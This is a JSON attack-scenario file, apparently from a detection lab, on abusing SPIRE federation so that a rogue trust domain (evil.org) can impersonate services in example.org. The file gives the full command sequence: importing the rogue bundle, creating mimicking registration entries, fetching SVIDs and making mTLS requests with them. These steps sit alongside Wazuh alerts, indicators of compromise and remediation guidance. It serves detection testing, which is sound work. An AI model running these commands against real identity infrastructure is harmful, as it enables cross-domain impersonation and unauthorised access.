@@ -1,0 +1,220 @@
+{
+  "id": "S7-11",
+  "name": "SPIRE Federation Trust Domain Abuse",
+  "category": "SPIFFE/SPIRE",
+  "version": "1.0",
+  "description": "Exploit SPIRE federation to issue SVIDs from a rogue trust domain (evil.org) that are trusted by workloads in the legitimate domain (example.org). The attacker controls a federated SPIRE server and leverages the trust relationship to impersonate services across domain boundaries.",
+  "difficulty": "Expert",
+  "real_world_relevance": "SPIFFE federation enables cross-organization workload authentication. If an attacker compromises or controls a federated trust domain, they can issue SVIDs trusted by the victim's infrastructure. This mirrors real-world supply chain attacks where a trusted partner's identity provider is compromised (SolarWinds SAML token forging, Okta supply chain).",
+
+  "mitre_attack": {
+    "tactics": ["Initial Access", "Credential Access", "Defense Evasion"],
+    "techniques": [
+      {"id": "T1199", "name": "Trusted Relationship"},
+      {"id": "T1556", "name": "Modify Authentication Process"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["spire-server", "spire-server-evil", "spire-agent", "k8s-node-1"],
+    "network": "k8s_net",
+    "profile": "federation"
+  },
+
+  "attack_flow": {
+    "description": "Attacker controls a federated SPIRE server (evil.org) and abuses the trust relationship to issue SVIDs that are accepted by services in example.org",
+    "diagram": [
+      "1. Attacker controls evil.org SPIRE server (federated trust domain)",
+      "2. Export evil.org trust bundle and import it into example.org SPIRE server",
+      "3. Create registration entries in evil.org that mimic legitimate service names",
+      "4. Issue SVIDs from evil.org for spiffe://evil.org/impersonated-service",
+      "5. Present evil.org SVID to example.org services that accept federated identities",
+      "6. Gain unauthorized access to cross-domain resources"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Reconnaissance",
+      "description": "Enumerate the target trust domain's federation configuration and discover which SPIFFE IDs are in use",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-server-evil",
+          "command": "/opt/spire/bin/spire-server bundle show -socketPath /tmp/spire-server/private/api.sock -format spiffe",
+          "description": "Export evil.org trust bundle for federation"
+        },
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "/opt/spire/bin/spire-server bundle list -socketPath /tmp/spire-server/private/api.sock",
+          "description": "List existing federation bundles on target server (if API access available)"
+        }
+      ]
+    },
+    {
+      "name": "Federation Establishment",
+      "description": "Establish federation trust between the rogue domain and the target domain by importing the evil.org bundle into example.org",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-server-evil",
+          "command": "/opt/spire/bin/spire-server bundle show -socketPath /tmp/spire-server/private/api.sock -format spiffe > /tmp/evil-bundle.json",
+          "description": "Export evil.org trust bundle to file"
+        },
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "/opt/spire/bin/spire-server bundle set -id spiffe://evil.org -path /tmp/evil-bundle.json -socketPath /tmp/spire-server/private/api.sock",
+          "description": "Import evil.org bundle into example.org server — establishes federation trust"
+        },
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "/opt/spire/bin/spire-server bundle list -socketPath /tmp/spire-server/private/api.sock",
+          "description": "Verify evil.org bundle is now trusted by example.org"
+        }
+      ]
+    },
+    {
+      "name": "Rogue Identity Creation",
+      "description": "Create registration entries in evil.org that impersonate services expected by example.org workloads",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-server-evil",
+          "command": "/opt/spire/bin/spire-server entry create -parentID spiffe://evil.org/spire/agent/x509pop/evil-agent -spiffeID spiffe://evil.org/impersonated-service -selector unix:uid:0 -socketPath /tmp/spire-server/private/api.sock",
+          "description": "Create entry in evil.org mimicking a legitimate service name"
+        },
+        {
+          "type": "exec",
+          "target": "spire-server-evil",
+          "command": "/opt/spire/bin/spire-server entry create -parentID spiffe://evil.org/spire/agent/x509pop/evil-agent -spiffeID spiffe://evil.org/payment-service -selector unix:uid:0 -federatesWith spiffe://example.org -socketPath /tmp/spire-server/private/api.sock",
+          "description": "Create federated entry that explicitly targets example.org trust domain"
+        }
+      ]
+    },
+    {
+      "name": "SVID Issuance and Cross-Domain Access",
+      "description": "Fetch SVIDs from the evil.org agent and use them to access services in example.org",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "/opt/spire/bin/spire-agent api fetch x509 -socketPath /opt/spire/sockets/workload_api.sock -write /tmp/svids/",
+          "description": "Fetch X.509 SVID from evil.org — includes federated trust bundle"
+        },
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "openssl x509 -in /tmp/svids/svid.0.pem -text -noout | grep -A1 'Subject Alternative Name'",
+          "description": "Verify SVID contains evil.org SPIFFE ID"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "curl --cert /tmp/svids/svid.0.pem --key /tmp/svids/svid.0.key --cacert /tmp/svids/bundle.0.pem https://web-frontend.example.org:8443/api/data",
+          "description": "Use evil.org SVID to access example.org service via mTLS — service trusts federated bundle"
+        }
+      ]
+    },
+    {
+      "name": "Detection Confirmation",
+      "description": "Trigger monitoring to confirm detection of federation abuse",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "python3 /opt/spire-monitor/spire_identity_monitor.py",
+          "description": "Run SPIRE identity monitor to detect cross-domain federation anomaly"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "SPIRE Server Audit",
+      "description": "Foreign trust bundle imported via bundle set API — new federation relationship established",
+      "wazuh_rule": "101090"
+    },
+    {
+      "type": "SPIRE Server Audit",
+      "description": "SVID fetch for cross-domain identity — workload received SVID from federated trust domain",
+      "wazuh_rule": "101091"
+    },
+    {
+      "type": "SPIRE Server Audit",
+      "description": "Registration entry created with federatesWith directive targeting external domain",
+      "wazuh_rule": "101020"
+    },
+    {
+      "type": "Network",
+      "description": "mTLS connection using SVID from unexpected trust domain",
+      "wazuh_rule": "101091"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "101090",
+      "level": 14,
+      "description": "NHI: SPIRE federation bundle imported — new trust domain added"
+    },
+    {
+      "rule_id": "101091",
+      "level": 13,
+      "description": "NHI: Cross-domain SVID fetch — federated identity used"
+    },
+    {
+      "rule_id": "101020",
+      "level": 12,
+      "description": "NHI: SPIRE registration entry created with federation directive"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Remove the evil.org federation bundle from example.org SPIRE server",
+      "Revoke all SVIDs issued to workloads that authenticated via the rogue federation",
+      "Audit all federation bundles currently trusted by the SPIRE server",
+      "Block network access from workloads presenting evil.org SVIDs"
+    ],
+    "long_term": [
+      "Implement SPIFFE ID allowlists for federated trust domains — only accept specific SPIFFE IDs, not entire trust domains",
+      "Require mutual federation approval workflows with out-of-band verification",
+      "Monitor bundle set API calls and alert on new federation relationships",
+      "Use SPIRE bundle endpoint authentication (web-PKI or mutual TLS) to prevent unauthorized bundle exchanges",
+      "Implement federation trust TTLs and require periodic re-authorization",
+      "Deploy network segmentation to limit cross-domain service access"
+    ]
+  },
+
+  "demo_script": {
+    "container": "spire-server",
+    "commands": [
+      "scripts/talk/demo-spiffe-federation-abuse.sh"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "SPIFFE Federation Specification",
+      "url": "https://github.com/spiffe/spiffe/blob/main/standards/SPIFFE_Federation.md"
+    },
+    {
+      "title": "SPIRE Federation Configuration",
+      "url": "https://spiffe.io/docs/latest/architecture/federation/"
+    },
+    {
+      "title": "SolarWinds SAML Token Forging — Analogous Trust Domain Abuse",
+      "url": "https://www.mandiant.com/resources/blog/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor"
+    },
+    {
+      "title": "SPIFFE/SPIRE Security Considerations",
+      "url": "https://spiffe.io/docs/latest/spire-about/spire-concepts/"
+    }
+  ]
+}
